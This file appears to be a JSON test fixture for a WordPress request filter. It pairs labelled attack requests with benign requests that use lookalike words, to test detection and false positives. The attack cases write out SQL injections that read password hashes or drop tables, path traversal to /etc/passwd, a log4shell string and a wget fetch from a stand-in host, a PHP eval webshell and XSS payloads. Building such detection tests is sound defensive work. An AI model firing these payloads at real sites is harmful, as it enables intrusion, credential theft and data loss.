@@ -1,0 +1,563 @@
+{
+    "attacks": [
+        {
+            "name": "sqlmap",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [],
+                "userAgent": "sqlmap/1.8#stable (https://sqlmap.org)"
+            },
+            "rule": "scanner"
+        },
+        {
+            "name": "wpscan",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [],
+                "userAgent": "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"
+            },
+            "rule": "scanner"
+        },
+        {
+            "name": ".env",
+            "request": {
+                "path": "/.env",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": ".env.production",
+            "request": {
+                "path": "/app/.env.production",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": ".git config",
+            "request": {
+                "path": "/.git/config",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "wp-config backup",
+            "request": {
+                "path": "/wp-config.php.bak",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "wp-config tilde",
+            "request": {
+                "path": "/wp-config.php~",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "phpunit rce",
+            "request": {
+                "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "sql dump",
+            "request": {
+                "path": "/backup.sql.gz",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "debug.log",
+            "request": {
+                "path": "/wp-content/debug.log",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "webshell",
+            "request": {
+                "path": "/wp-content/uploads/alfa-rex.php",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "probe"
+        },
+        {
+            "name": "union select",
+            "request": {
+                "path": "/",
+                "query": "id=1 UNION ALL SELECT 1,2,user_pass FROM wp_users",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union comment",
+            "request": {
+                "path": "/",
+                "query": "id=1/**/union/**/select/**/1",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union null",
+            "request": {
+                "path": "/",
+                "query": "q=' UNION SELECT NULL,NULL-- -",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union columns",
+            "request": {
+                "path": "/",
+                "query": "id=-1 union select user_login,user_pass from wp_users",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union one column",
+            "request": {
+                "path": "/",
+                "query": "q=1' UNION SELECT user_pass FROM wp_users-- ",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union one column, plus signs",
+            "request": {
+                "path": "/",
+                "query": "id=-1+union+select+user_pass+from+wp_users",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union one column in a form",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "x') union all select user_email from wp_users#"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "union one column after a number",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "5 union select user_pass from wp_users"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "information_schema",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "1' and (select count(*) from information_schema.tables)>0"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "time based",
+            "request": {
+                "path": "/",
+                "query": "id=1' AND SLEEP(5)-- -",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "or 1=1",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "admin' or '1'='1"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "drop table",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "1; DROP TABLE wp_users"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "traversal",
+            "request": {
+                "path": "/",
+                "query": "file=../../../../wp-config.php",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "traversal"
+        },
+        {
+            "name": "passwd",
+            "request": {
+                "path": "/",
+                "query": "page=/etc/passwd",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "traversal"
+        },
+        {
+            "name": "php filter",
+            "request": {
+                "path": "/",
+                "query": "f=php://filter/convert.base64-encode/resource=index",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "traversal"
+        },
+        {
+            "name": "log4shell",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "${jndi:ldap://x.example/a}"
+                ],
+                "userAgent": "${jndi:ldap://x.example/a}"
+            },
+            "rule": "code"
+        },
+        {
+            "name": "eval",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "<?php eval($_POST[1]); ?>"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "code"
+        },
+        {
+            "name": "wget",
+            "request": {
+                "path": "/",
+                "query": "cmd=wget http://x.example/s.sh",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "code"
+        },
+        {
+            "name": "script in url",
+            "request": {
+                "path": "/",
+                "query": "s=<script>alert(1)</script>",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "xss"
+        },
+        {
+            "name": "svg onload",
+            "request": {
+                "path": "/",
+                "query": "q=<svg/onload=alert(1)>",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "xss"
+        },
+        {
+            "name": "javascript scheme",
+            "request": {
+                "path": "/",
+                "query": "redirect=javascript:alert(document.cookie)",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "xss"
+        },
+        {
+            "name": "sqli encoded twice",
+            "request": {
+                "path": "/",
+                "query": "id=1%27%20union%20select%201,user_pass%20from%20wp_users--%20",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "sqli"
+        },
+        {
+            "name": "traversal encoded twice",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "traversal"
+        },
+        {
+            "name": "script encoded twice",
+            "request": {
+                "path": "/",
+                "query": "s=%3Cscript%3Ealert(1)%3C/script%3E",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            },
+            "rule": "xss"
+        }
+    ],
+    "ordinary": [
+        {
+            "name": "home",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "search select",
+            "request": {
+                "path": "/",
+                "query": "s=select your product",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "search union",
+            "request": {
+                "path": "/",
+                "query": "s=european union select committee",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "percent sign in a search",
+            "request": {
+                "path": "/",
+                "query": "s=descuento 100%25 & 50%2525",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "encoded link in a param",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "https%3A%2F%2Fexample.org%2Fa%3Fb%3D1"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "union sentence in a form",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "The European Union select committee from Brussels met today."
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "union sentence after a year",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "Since 1993 Union select members from all regions."
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "utm",
+            "request": {
+                "path": "/oferta/",
+                "query": "utm_source=newsletter&utm_campaign=update-2026",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "message with sql words",
+            "request": {
+                "path": "/wp-json/contact-form-7/v1/contact-forms/7/feedback",
+                "query": "",
+                "params": [
+                    "Hola, quiero update mi pedido y delete la dirección antigua. Select the blue one, please.",
+                    "Can you drop the price? I will sleep on it and decide tomorrow.",
+                    "My username is admin or something like that, 1 = 1 bedroom?"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "message with html in a form",
+            "request": {
+                "path": "/wp-comments-post.php",
+                "query": "",
+                "params": [
+                    "Me encanta <strong>esta casa</strong>, onload no sé qué significa"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "relative path in text",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "Está en ../fotos/casa.jpg"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "wp-config itself",
+            "request": {
+                "path": "/wp-config.php",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "normal php",
+            "request": {
+                "path": "/wp-login.php",
+                "query": "action=lostpassword",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "sql in a post slug",
+            "request": {
+                "path": "/blog/how-to-select-from-a-table-in-mysql/",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "env word in slug",
+            "request": {
+                "path": "/blog/environment-friendly-homes/",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "info page",
+            "request": {
+                "path": "/info/",
+                "query": "",
+                "params": [],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "curl in text",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "Curl your hair with this product"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "eval word",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "Please evaluate (and approve) my request"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        },
+        {
+            "name": "email with javascript word",
+            "request": {
+                "path": "/",
+                "query": "",
+                "params": [
+                    "I know javascript: React and Vue"
+                ],
+                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+            }
+        }
+    ]
+}
